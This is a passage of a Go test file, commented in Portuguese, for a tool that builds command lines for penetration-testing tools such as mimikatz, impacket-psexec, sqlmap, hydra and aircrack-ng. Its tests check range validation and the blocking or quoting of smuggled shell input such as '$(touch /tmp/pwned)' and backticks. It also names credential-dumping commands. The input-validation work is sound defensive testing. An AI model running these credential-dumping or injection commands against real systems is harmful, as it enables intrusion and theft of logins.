		t.Fatalf("impacket sem tool: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, "impacket-psexec") {
		t.Errorf("esperava default psexec, obtive %q", res.Commands[0].Code)
	}

	res, err = c.Generate("mimikatz", map[string]string{})
	if err != nil {
		t.Fatalf("mimikatz sem module: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, "sekurlsa::logonpasswords") {
		t.Errorf("esperava default logonpasswords, obtive %q", res.Commands[0].Code)
	}
}

func TestNumberRangeValidation(t *testing.T) {
	c := NewCatalog()

	cases := []struct {
		tool string
		ans  map[string]string
	}{
		{"nikto", map[string]string{"url": "http://10.0.0.1", "port": "0"}},
		{"nikto", map[string]string{"url": "http://10.0.0.1", "port": "70000"}},
		{"aircrack-ng", map[string]string{"iface": "wlan0", "channel": "0"}},
		{"aircrack-ng", map[string]string{"iface": "wlan0", "channel": "200"}},
		{"fluxion", map[string]string{"iface": "wlan0", "channel": "0"}},
		{"sqlmap", map[string]string{"url": "http://10.0.0.1", "level": "4"}},
		{"sqlmap", map[string]string{"url": "http://10.0.0.1", "risk": "4"}},
		{"commix", map[string]string{"url": "http://10.0.0.1", "level": "4"}},
		{"tcpdump", map[string]string{"iface": "eth0", "count": "0"}},
		{"hydra", map[string]string{"service": "ssh", "target": "10.0.0.1", "threads": "0"}},
	}
	for _, tc := range cases {
		_, err := c.Generate(tc.tool, tc.ans)
		var ve *ValidationError
		if !errors.As(err, &ve) {
			t.Errorf("%s: esperava ValidationError para número fora do range, obtive %v", tc.tool, err)
		}
	}
}

func TestSafeDQBlocksShellSubstitution(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("mimikatz", map[string]string{
		"module": "dcsync",
		"domain": "corp$(touch /tmp/pwned)",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para domínio com $(), obtive %v", err)
	}

	_, err = c.Generate("mimikatz", map[string]string{
		"module": "dcsync",
		"domain": "corp`id`",
	})
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para domínio com backtick, obtive %v", err)
	}
}

func TestAircrackCaptureIsQuoted(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("aircrack-ng", map[string]string{
		"iface":   "wlan0",
		"channel": "6",
		"capture": "x; touch /tmp/pwned",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	last := res.Commands[len(res.Commands)-1].Code
	if !strings.Contains(last, `'x; touch /tmp/pwned-01.cap'`) {
		t.Errorf("prefixo de captura deveria estar quotado: %q", last)
	}
}

func TestEmptySelectNoLongerProducesEmptyCommand(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("mimikatz", map[string]string{})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if len(res.Commands) == 0 || strings.Contains(res.Commands[0].Code, `""`) {
		t.Errorf("mimikatz sem module não deveria produzir argumento vazio: %q", res.Commands[0].Code)
	}
}
